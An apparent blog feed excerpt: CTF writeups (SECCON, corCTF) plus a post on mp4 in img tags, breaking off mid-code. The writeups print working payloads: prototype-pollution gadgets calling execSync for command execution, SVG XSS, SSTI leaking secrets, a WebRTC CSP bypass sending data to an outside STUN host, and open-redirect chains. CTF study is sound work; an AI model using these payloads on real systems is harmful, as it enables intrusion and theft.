be:</p><pre class="line-numbers language-none"><code class="language-none">&#123; helllo: &#39;world&#39; &#125;   &#123;    src &#x3D; src + &quot;\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\n&quot;;  &#125;  &#x2F;&#x2F; other codes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The reason for this is that after changing the delimiter, the above text is equivalent to:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, it is equivalent to executing <code>console.log(src)</code>, so src will appear in the output.</p><h3><span id="node-ppjail-5-solves">node-ppjail (5 solves)</span></h3><p>This question allows you to pollute things on the prototype, and the value can be a function, but the problem is that you cannot pollute existing properties.</p><p>The solution is to trigger an error and then find out what the Node.js  will do, and then pollute the corresponding properties.</p><p>A simple example is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>Object<span class="token punctuation">.</span>toString<span class="token punctuation">.</span>arguments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The output is:</p><pre class="line-numbers language-none"><code class="language-none">pwn&#x2F;js&#x2F;pp.js:4Object.toString.arguments                ^[TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them]Node.js v20.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>As for how to find this attribute, it seems like a good choice to patch V8 by learning from <a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox">maple</a>.</p><p>The author has found two other methods, which are recorded here for future reference. The source is the <a href="https://blog.arkark.dev/2023/09/21/seccon-quals/">author’s writeup</a>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 1:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77</span>            <span class="token string">"1"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"callback"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 2:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064</span>            <span class="token string">"circular"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"get"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token comment"># ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause</span>            <span class="token string">"cause"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token comment"># Cause an error</span>        <span class="token string">"toString"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"caller"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="deno-ppjail-2-solves">deno-ppjail (2 solves)</span></h3><p>Similar to the previous question, but this time we need to find a gadget for deno.</p><p>The gadget that the author found is <code>Object.prototype.return</code>.</p><p>Maple found <code>cause + circular.get</code>, and @parrot409 found <code>nodeProcessUnhandledRejectionCallback</code>.</p><p>For more detailed explanations, you can refer to maple’s writeup: <a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail">https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail</a></p><h3><span id="hidden-note-1-solve">hidden-note (1 solve)</span></h3><p>This challenge is also interesting. It belongs to the type of XS leaks. There is a search function, but the search results filter out the flag.</p><p>The search result page can leak information through meta redirect, so we can see the result page. However, the flag has been removed from the result page. What else can we do?</p><p>During the search, the results are sorted first, and then the flag is removed. The sorting method used in this question is a stable sort when the number of elements is &lt;&#x3D; 12, and an unstable sort when the number of elements is &gt; 12.</p><p>Therefore, we can create exactly 12 notes with the content: <code>ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|...</code></p><p>Suppose the flag is <code>SECCON&#123;abc&#125;</code>. When searching for <code>ECCON&#123;@</code>, because the total number is 12, it is a stable sort, and the order of the IDs on the search result page will not change.</p><p>But if we search for <code>ECCON&#123;a</code>, the result becomes 13, and it becomes an unstable sort, changing the order of the notes.</p><p>Therefore, by examining the content of the result page, we can determine whether the original search result was within 12 or more than 12, and use it as an oracle to leak the flag.</p><p>This solution is really cool and innovative! Both Ark, who created the challnenge, and maple, who solved it, are really amazing.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Both of these competitions had many interesting but challenging problems. I really learned a lot.&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;nim json, null byte&lt;/li&gt;
&lt;li&gt;nim request smuggling&lt;/li&gt;
&lt;li&gt;js-yaml&lt;/li&gt;
&lt;li&gt;web worker&lt;/li&gt;
&lt;li&gt;blob URL&lt;/li&gt;
&lt;li&gt;meta redirect&lt;/li&gt;
&lt;li&gt;file protocol &amp;amp; .localhost domain&lt;/li&gt;
&lt;li&gt;sxg: Signed Exchanges&lt;/li&gt;
&lt;li&gt;431 CSP bypass&lt;/li&gt;
&lt;li&gt;DOM clobbering document.body&lt;/li&gt;
&lt;li&gt;ejs delimiter&lt;/li&gt;
&lt;li&gt;Node.js + Deno prototype pollution gadget&lt;/li&gt;
&lt;li&gt;XSleaks golang sort&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>TIL:img src also supports mp4 (Safari only)</title>
    <link href="https://blog.huli.tw/2023/09/11/en/mp4-in-img-src/"/>
    <id>https://blog.huli.tw/2023/09/11/en/mp4-in-img-src/</id>
    <published>2023-09-11T13:10:00.000Z</published>
    <updated>2023-09-11T13:36:55.327Z</updated>
    
    <content type="html"><![CDATA[<p>Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected.</p><p>However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load.</p><span id="more"></span><p>Therefore, many websites have started using the <code>&lt;video&gt;</code> tag to display these animated images. By converting them to the mp4 format, the file size can be significantly reduced. However, there are some downsides to using the <code>&lt;video&gt;</code> tag instead of <code>&lt;img&gt;</code>, such as the lack of native support for lazy loading and other inconveniences.</p><p>During my research, I unexpectedly discovered that Safari actually supports mp4 in the <code>&lt;img&gt;</code> tag! This means you can do the following:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>This feature has been available since 2017: <a href="https://bugs.webkit.org/show_bug.cgi?id=176825">Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation</a></p><p>I found out about this in the following article: <a href="https://calendar.perfplanet.com/2017/animated-gif-without-the-gif/">Evolution of &lt;img&gt;: Gif without the GIF</a></p><p>If <code>&lt;img&gt;</code> can also support mp4, we can take advantage of the benefits of both tags without having to switch tags. We can have lazy loading support and significantly reduce the file size.</p><p>Unfortunately, this feature is only supported in Safari. Even after six years, I haven’t seen this functionality in Chromium or Firefox, and it seems unlikely to be implemented in the future.</p><p>Chromium has explicitly stated that it will not support this feature. The discussion thread can be found here: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791658">Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt;</a>. It was marked as “Wont fix” in 2018, with the following reason:</p><pre class="line-numbers language-none"><code class="language-none">Closing as WontFix per c#35, due to the following:- The widespread adoption of WebP (addresses CDN use case)- Forthcoming AV1 based image formats (ditto).- Memory inefficiency with allowing arbitrary video in image.- Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The first point mentioned that WebP actually has an Animated WebP format that can be used within the <code>&lt;img src&gt;</code> tag and is also animated. It has even smaller file sizes. For more information on the pros and cons, you can refer to Google’s own documentation: <a href="https://developers.google.com/speed/webp/faq?hl=en#why_should_i_use_animated_webp">What are the benefits of using animated WebP?</a></p><p>The second point mentions that the newer image format AVIF also has Animated AVIF, which also supports animated images.</p><p>If these new image formats can replace GIFs, it seems that there is no real need to use mp4.</p><p>As for Firefox, although they haven’t explicitly stated that they won’t implement this feature, the issue hasn’t seen much activity for a long time: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=895131">Add support for video formats in &lt;img&gt;, behaving like animated gif</a></p><p>Some people hope to add this feature to the specification, but there hasn’t been much progress for a while: <a href="https://github.com/whatwg/html/issues/7141">Require img to be able to load the same video formats as video supports #7141</a></p><p>In conclusion, it seems that this feature will only be available in Safari.</p><p>Unfortunately, the image service I am using only supports converting GIFs to mp4 and does not support converting to animated WebP or animated AVIF, which would have been very convenient.</p><h2><span id="summary">Summary</span></h2><p>If you want to continue using <code>&lt;img&gt;</code> for animated images, the most comprehensive approach would be to use the <code>&lt;picture&gt;</code> tag with multiple file formats, like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/avif<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.avif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/webp<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.webp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.gif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This ensures that the results are displayed correctly on every browser and selects the image with usually smaller file size.</p><p>I tried it out myself with a simple gif that had an original size of 75 KB:</p><p><img src="/img/mp4-in-img-src/test.gif" alt="gif"></p><p>After converting it to WebP, it became 58 KB (-22.6%):</p><p><img src="/img/mp4-in-img-src/test.webp" alt="webp"></p><p>Converting it to mp4 reduced the size to 17 KB (-77.3%):</p><p><img src="/img/mp4-in-img-src/test.mp4" alt="Only supported by Safari, may not display properly"></p><p>Converting it to AVIF reduced the size to 11 KB (-85.3%):</p><p><img src="/img/mp4-in-img-src/test.avif" alt="AVIF format, may not be supported by newer browsers"></p><p>It seems that the latest file formats are quite impressive, reducing the size significantly.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Some websites use GIFs for certain images because they are animated and appear more impressive than static images. Sometimes, the need for an animated image arises, such as in the case of stickers where animation is expected.&lt;/p&gt;
&lt;p&gt;However, one of the well-known drawbacks of GIFs is their large file size. Especially on mobile devices with higher resolutions, larger images are required. Even if only a 52px image is displayed, a 156px image needs to be prepared, resulting in increased file size. In terms of web development, it is always better to have fewer and smaller resources to load.&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>corCTF 2023 &amp; Sekai CTF 2023 Writeup</title>
    <link href="https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/02/en/corctf-sekaictf-2023-writeup/</id>
    <published>2023-09-02T06:10:44.000Z</published>
    <updated>2023-09-02T06:32:20.275Z</updated>
    
    <content type="html"><![CDATA[<p>I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.</p><p>As usual, here are the keywords I noted:</p><ol><li>GraphQL batch query + alias</li><li>Python os.path.join absolute path</li><li>Svg XSS, foreignObject</li><li>WebRTC CSP bypass</li><li>Status code xsleak</li><li>DNS rebinding</li><li>nmap command injection</li><li>Ruby rack file upload temporary storage</li><li>buildConstraintViolationWithTemplate EL injection</li><li>Request smuggling</li><li>document.baseURI</li><li>200&#x2F;404 status code xsleak</li></ol><span id="more"></span><h2><span id="corctf-2023">corCTF 2023</span></h2><p>The source code for the challenges is available here: <a href="https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web">https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web</a><br>Write-ups for some of the web challenges: <a href="https://brycec.me/posts/corctf_2023_challenges">https://brycec.me/posts/corctf_2023_challenges</a></p><h3><span id="force-118-solves">force (118 solves)</span></h3><p>The PIN code has 10,000 possible values, and you need to find the correct value within 10 requests using a GraphQL query.</p><p>The solution is to use batch query + alias, which allows you to try multiple times within a single request (taken from the article below):</p><pre class="line-numbers language-none"><code class="language-none">&#123;  flag0:flag(pin:0),  flag1:flag(pin:1),  flag2:flag(pin:2),  flag3:flag(pin:3),  flag4:flag(pin:4),  flag5:flag(pin:5)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Write-ups by others:</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/force/">https://siunam321.github.io/ctf/corCTF-2023/web/force/</a></li><li><a href="https://github.com/hanzotaz/corctf2023_writeup/">https://github.com/hanzotaz/corctf2023_writeup&#x2F;</a></li></ol><h3><span id="msfrognymize-64-solves">msfrognymize (64 solves)</span></h3><p>The key is in this piece of code:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/anonymized/&lt;image_file>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve_image</span><span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> unquote<span class="token punctuation">(</span>image_file<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".."</span> <span class="token keyword">in</span> file_path <span class="token keyword">or</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Image </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_path<span class="token punctuation">&#125;</span></span><span class="token string"> cannot be found."</span></span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'image/png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python’s <code>os.path.join</code> has a well-known behavior where it ignores everything before the absolute path:</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;test.txt&#39;)&#39;&#x2F;tmp&#x2F;abc&#x2F;test.txt&#39;&gt;&gt;&gt; os.path.join(&#39;&#x2F;tmp&#x2F;abc&#39;, &#39;&#x2F;test.txt&#39;)&#39;&#x2F;test.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, by leveraging this behavior, you can achieve arbitrary file reading and obtain the flag.</p><p>Reference: <a href="https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/">https://siunam321.github.io/ctf/corCTF-2023/web/msfrognymize/</a></p><h3><span id="frogshare-33-solves">frogshare (33 solves)</span></h3><p>This challenge uses a library called <a href="https://github.com/shubhamjain/svg-loader">svg-loader</a>, which automatically loads an SVG URL. Therefore, this challenge is based on SVG XSS.</p><p>During the import, for security reasons, scripts and inline scripts are automatically removed, but <code>&lt;foreignObject&gt;</code> is overlooked. This tag allows you to load HTML inside an SVG, and it can be bypassed by using iframe srcdoc:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>script<span class="token entity named-entity" title="&gt;">&amp;gt;</span>alert(document.domain)<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/script<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Next, you need to bypass CSP. In this challenge, <code>&lt;base&gt;</code> is used to change the location of script loading.</p><p>References:</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/">https://siunam321.github.io/ctf/corCTF-2023/web/frogshare/</a></li></ol><p>Renwa’s solution involves rebuilding the app inside an iframe and inserting a script using Next.js features: <a href="https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd">https://gist.github.com/RenwaX23/75f945e25123442ea341d855c22be9dd</a></p><h3><span id="youdirect-5-solves">youdirect (5 solves)</span></h3><p>This challenge is about finding an open redirect on YouTube.</p><p>@EhhThing provided a solution (clicking will log you out) that involves two layers of open redirect:</p><p><a href="https://youtube.com/logout?continue=http://googleads.g.doubleclick.net/pcs/click?adurl=https://webhook.site/ccb8a675-14cb-419c-9e85-3b709a99e394">https://youtube.com/logout?continue=http%3A%2F%2Fgoogleads%2Eg%2Edoubleclick%2Enet%2Fpcs%2Fclick%3Fadurl%3Dhttps%3A%2F%2Fwebhook%2Esite%2Fccb8a675%2D14cb%2D419c%2D9e85%2D3b709a99e394</a></p><p>@pew provided:<br><a href="https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew">https://www.youtube.com/attribution_link?u=https://m.youtube.com@pew.com/pew</a></p><p>@Josh provided:<br><a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&q=https://sheiwknajaka.free.beeceptor.com/&v=-5Rm9ymMTRA&html_redirect=1">https://www.youtube.com/redirect?event=video_description&amp;redir_token=QUFFLUhqbC01MWUzXzV4RVhlVExyRmtlOFZ4Z05pekhaQXxBQ3Jtc0ttQVFnRno1TnpIRWQyb1lnMmhJYW12ZWFTMmIwQVdrcG01Y1A5eGV4REtUV0taTzZKTUdmcWFxN3lFczRNanZuZGNtNmtzOG1pdExoTzYtSE40dHRBa2otZ05kMjgwOHFEZFo3czRwU2dRQTFQekpQcw&amp;q=https%3A%2F%2Fsheiwknajaka.free.beeceptor.com%2F&amp;v=-5Rm9ymMTRA&amp;html_redirect=1</a></p><p>This one is special. In fact, each link in the YouTube video description generates a redirect link, but they are bound to session IDs on the webpage. Therefore, if you switch devices, you cannot use them. However, this link was generated on the mobile app, which may be because the mobile app does not have cookies and is not restricted. Interesting.</p><h3><span id="crabspace-4-solves">crabspace (4 solves)</span></h3><p>The first step is to use tera’s SSTI to leak environment variables: <code>&#123;&#123; get_env(name="SECRET") &#125;&#125;</code></p><p>Then, you can bypass CSP using WebRTC:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    c<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token literal-property property">iceServers</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">urls</span><span class="token operator">:</span><span class="token string">"stun:&#123;&#123;user.id&#125;&#125;.x.cjxol.com:1337"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>With these two steps, you can forge an admin session and obtain the flag.</p><p>References:</p><ol><li><a href="https://www.cjxol.com/posts/corctf-2023-crabspace-web-writeup/">corCTF 2023 web&#x2F;crabspace Writeup</a></li></ol><h3><span id="leakynote-3-solves">leakynote (3 solves)</span></h3><p>This challenge was solved during the competition. In simple terms, it provides a free HTML injection and a strict CSP:</p><pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy &quot;script-src &#39;none&#39;; object-src &#39;none&#39;; frame-ancestors &#39;none&#39;;&quot;;<span aria-hidden="true" 